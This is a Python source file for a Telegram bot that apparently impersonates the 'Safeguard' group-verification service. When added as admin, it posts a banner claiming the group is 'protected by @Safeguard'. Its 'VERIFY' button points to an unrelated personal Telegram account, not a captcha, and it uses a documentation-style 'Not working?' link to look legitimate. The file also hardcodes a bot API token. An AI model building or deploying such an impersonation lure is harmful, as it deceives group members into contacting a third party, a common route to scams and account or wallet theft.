import asyncio
from typing import Optional
from io import BytesIO
from telegram import(
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Update,
)
from telegram.ext import(
    Application,
    ApplicationBuilder,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
    CallbackQueryHandler,
    ChatMemberHandler
)
from telegram.constants import ChatMemberStatus, ChatType
from PIL import Image
import dotenv

TOKEN = "8072368645:AAEQ38wkKj7dWUpErRzaGPyL6qg3dsMGZM0" 
BOT_USERNAME = "Wh_SafeguardUXRobot"
WELCOME_SENT = set()    
Safeguard_Image = Image.open('assets/safeguard1.jpg')
verify_btn = InlineKeyboardButton(text="VERIFY", url="https://t.me/@whalesharka")
url="https://docs.safeguard.run/group-security/verification-issues"

tap_btn = InlineKeyboardButton(text="Tap to verify", url="https://t.me/Wh_SafeguardUXRobot")

bio = BytesIO()
Safeguard_Image.save(bio, format="JPEG")
bio.seek(0)
async def chat_member_updated(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global WELCOME_SENT
    
    if not update.my_chat_member:
        print("Received an update, but it's not a chat member update for our bot.")
        return

    member_update = update.my_chat_member
    chat_id = member_update.chat.id
    new_status = member_update.new_chat_member.status
    old_status = member_update.old_chat_member.status

    print(f"Bot status changed in chat {chat_id}: {old_status} -> {new_status}")
    
    if new_status == ChatMemberStatus.ADMINISTRATOR:
        if chat_id not in WELCOME_SENT:
            await asyncio.sleep(1)  # Short delay for status propagation
            
            try:
                chat_type = "channel" if member_update.chat.type == ChatType.CHANNEL else "group"
                keyboard = [[tap_btn]]
                reply_markup = InlineKeyboardMarkup(keyboard)

                await context.bot.send_photo(
                    chat_id=chat_id,
                    photo=bio,
                    caption=f"""{member_update.chat.title} is being protected by @Safeguard
Click below to verify you're human
""",
                    reply_markup=reply_markup
                )
                WELCOME_SENT.add(chat_id)
                print(f"Welcome message sent to {chat_type} {chat_id}")
            except Exception as e:
                print(f"Failed to send message in {chat_id}: {str(e)}")
        else:
            print(f"Already sent welcome to {chat_id}")
    else:
        print(f"Bot status changed to non-admin in {chat_id}")



async def clickHandler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle the button click."""
    print("clickHandler")
    query = update.callback_query
    await query.answer()
    # Extract the callback data from the clicked button
    callback_data = query.data
    

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    keyboard = [[verify_btn]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    message = (  
"Verify you're human with Safeguard Portal\n\n"  

"Click 'VERIFY' and complete captcha to gain entry - "'<a href="https://docs.safeguard.run/group-security/verification-issues">Not working?</a>'  
    )
    await update.message.reply_photo(photo=bio, caption=message, reply_markup=reply_markup, parse_mode='HTML') 

def main():
    application = ApplicationBuilder().token(TOKEN).build()
    application.add_handler(ChatMemberHandler(chat_member_updated, ChatMemberHandler.MY_CHAT_MEMBER))
    application.add_handler(CommandHandler("start", start))
    # application.add_handler(CallbackQueryHandler(clickHandler))
    application.run_polling(drop_pending_updates= True)

if __name__=='__main__':
    main()








